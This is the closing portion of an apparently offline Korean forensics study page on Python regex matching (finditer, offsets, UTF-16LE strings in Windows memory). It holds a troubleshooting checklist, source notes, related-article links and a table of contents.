+<p>1단계와 3단계가 교훈이다. <strong>큰 바이너리는 str로 읽지 않는다. 그리고 Windows 메모리의 문자열은 UTF-16LE라고 먼저 가정한다.</strong></p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
+<ol><li>위치가 필요한가 값만 필요한가 — 값만이면 <code>findall</code>이 더 짧다</li><li>이터레이터를 두 번 돌고 있지 않은가 — <code>list()</code>로 고정했는가</li><li>오프셋을 제출할 것이면 <code>&#39;rb&#39;</code> + <code>rb&#39;...&#39;</code>로 다시 뽑았는가</li><li><code>m.end()</code>를 마지막 문자 위치로 쓰고 있지 않은가</li><li>미매칭 그룹이 <code>None</code>인 것을 방어했는가</li><li>바이너리에서 0건이면 UTF-16LE를 시도했는가 (<code>p\x00o\x00...</code>)</li><li>큰 파일이면 <code>mmap</code>으로 바꿨는가</li><li>겹치는 매칭이 필요하면 <code>(?=(...))</code>로 바꿨는가</li><li><code>re.split</code> 결과에 구분자가 끼어 있지 않은가</li><li><code>grep -aob</code> 오프셋과 <code>xxd</code>로 교차검증했는가</li><li>문맥을 잘라 보고 decoy를 걸렀는가</li><li>시각 문자열이 있으면 UTC/KST를 확정했는가</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-057 — Python 공식 문서 <code>re</code> 모듈: <code>finditer</code> 반환형, <code>Match</code> 객체의 <code>group</code>/<code>groups</code>/<code>groupdict</code>/<code>start</code>/<code>end</code>/<code>span</code>/<code>lastindex</code>/<code>lastgroup</code>, <code>re.sub</code>에 함수 전달, <code>re.split</code>의 캡처 그룹 포함 규칙, 겹치지 않는 매칭 원칙</li><li><code>mmap</code>, <code>base64</code>, <code>datetime</code> 사용법은 같은 Python 표준 라이브러리 문서 계열에서 확인했다</li><li>PowerShell <code>-EncodedCommand</code>가 UTF-16LE 기반 Base64라는 점은 널리 확인된 동작이지만, 이 글의 <code>source_ids</code>에는 해당 1차 출처가 없다. <code>research/sources.json</code>에 Microsoft Learn의 <code>powershell.exe</code> 명령행 파라미터 문서를 추가하면 인용을 붙일 수 있다</li><li>예시 오프셋과 flag 문자열은 설명용 가상 데이터다</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./python-re-findall.html">
+    <span class="rel-id">FOR-0122 · 로그/Regex</span>
+    Python re.findall로 로그에서 값 뽑기: 그룹 개수가 반환형을 바꾼다
+  </a>
+  <a class="related-item" href="./python-named-group.html">
+    <span class="rel-id">FOR-0124 · 로그/Regex</span>
+    Python 명명 캡처 그룹으로 로그를 표로 만들기: (?P&lt;name&gt;...)
+  </a>
+  <a class="related-item" href="./grep-basics.html">
+    <span class="rel-id">FOR-0112 · 로그/Regex</span>
+    grep 기본 옵션 레퍼런스: -i -v -c -o -w -E -P -r 와 종료 코드
+  </a>
+  <a class="related-item" href="./grep-e-regex.html">
+    <span class="rel-id">FOR-0113 · 로그/Regex</span>
+    grep -E 확장 정규표현식(ERE) 실전: BRE와의 차이와 lookaround 대안
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./python-re-findall.html"><span class="rel-id">← FOR-0122</span>Python re.findall로 로그에서 값 뽑기: 그룹 개수가 반환형을 바꾼다</a>
+<a class="related-item" href="./python-named-group.html"><span class="rel-id">FOR-0124 →</span>Python 명명 캡처 그룹으로 로그를 표로 만들기: (?P&lt;name&gt;...)</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-match-객체의-메서드-표">1단계 — `Match` 객체의 메서드 표</a></li>
+<li class="toc-l3"><a href="#2단계-findall-대신-finditer를-쓰는-세-가지-이유">2단계 — `findall` 대신 `finditer`를 쓰는 세 가지 이유</a></li>
+<li class="toc-l3"><a href="#3단계-오프셋으로-원문-문맥-잘라-보기">3단계 — 오프셋으로 원문 문맥 잘라 보기</a></li>
+<li class="toc-l3"><a href="#4단계-문자-오프셋과-바이트-오프셋은-다르다">4단계 — 문자 오프셋과 바이트 오프셋은 다르다</a></li>
+<li class="toc-l3"><a href="#5단계-resub에-함수를-넘긴다">5단계 — `re.sub`에 함수를 넘긴다</a></li>
+<li class="toc-l3"><a href="#6단계-resplit과-겹치는-매칭">6단계 — `re.split`과 겹치는 매칭</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
